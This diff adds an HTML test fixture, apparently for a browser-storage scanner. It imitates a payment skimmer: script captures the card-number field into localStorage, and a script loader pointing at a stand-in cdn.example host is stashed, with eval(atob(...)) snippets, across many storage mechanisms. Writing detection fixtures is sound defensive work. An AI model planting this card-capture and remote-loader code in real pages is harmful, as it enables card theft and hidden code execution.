@@ -1,0 +1,36 @@
+<!doctype html><html><head><title>Stash</title>
+<script>
+  // Skimmer-style stash (modeled on Sansec 2026): encode what's typed into the card field, park it in
+  // localStorage for later upload. The scanner's dummy card number should be found here.
+  document.addEventListener('input', function (e) {
+    if (e.target.name === 'cardnumber') localStorage.setItem('cus_customer_id', btoa('n=' + e.target.value + '|CP'));
+  });
+  sessionStorage.setItem('checkout_step', '2');
+  // Other storage types for the inventory.
+  var open = indexedDB.open('shopdb', 1);
+  open.onupgradeneeded = function () { open.result.createObjectStore('carts').put({ items: 1 }, 'c1'); };
+  caches.open('assets-v1').then(function (c) { return c.put('/assets/x.css', new Response('x')); });
+  if (navigator.serviceWorker) navigator.serviceWorker.register('/sw.js');
+  // A payload parked in storage for later (inert: .example host). Once as code, once base64-encoded.
+  var payload = "(function(){var s=document.createElement('script');s.src=atob('aHR0cHM6Ly9jZG4uZXhhbXBsZS94LmpzJw==');document.head.appendChild(s);window.__ok=1;})();";
+  localStorage.setItem('payload_cache', payload);
+  localStorage.setItem('b64_payload', btoa(payload));
+  var open2 = indexedDB.open('loaderdb', 1);
+  open2.onupgradeneeded = function () { open2.result.createObjectStore('chunks').put({ code: "eval(atob('d2luZG93Ll9fYT0x'))" }, 'c1'); };
+  // Every other place a page can read a value back from.
+  window.name = payload;
+  history.replaceState({ boot: payload }, '');
+  document.cookie = 'cfg=' + encodeURIComponent(btoa(payload)) + '; path=/';
+  caches.open('scripts-v1').then(function (c) { return c.put('/assets/boot.js', new Response("eval(atob('d2luZG93Ll9fYj0x'))", { headers: { 'content-type': 'application/javascript' } })); });
+  navigator.storage.getDirectory().then(function (root) { return root.getFileHandle('loader.txt', { create: true }); })
+    .then(function (fh) { return fh.createWritable(); }).then(function (w) { return w.write(payload).then(function () { return w.close(); }); });
+  // In-browser SQLite lives in the Origin Private File System.
+  navigator.storage.getDirectory().then(function (root) {
+    return root.getDirectoryHandle('db', { create: true });
+  }).then(function (dir) {
+    return dir.getFileHandle('app.sqlite', { create: true });
+  }).then(function (fh) { return fh.createWritable(); }).then(function (w) {
+    return w.write(new TextEncoder().encode('SQLite format 3\u0000' + 'x'.repeat(100))).then(function () { return w.close(); });
+  });
+</script>
+</head><body><form action="/pay" method="post"><input name="cardnumber"><input name="cvv"></form></body></html>
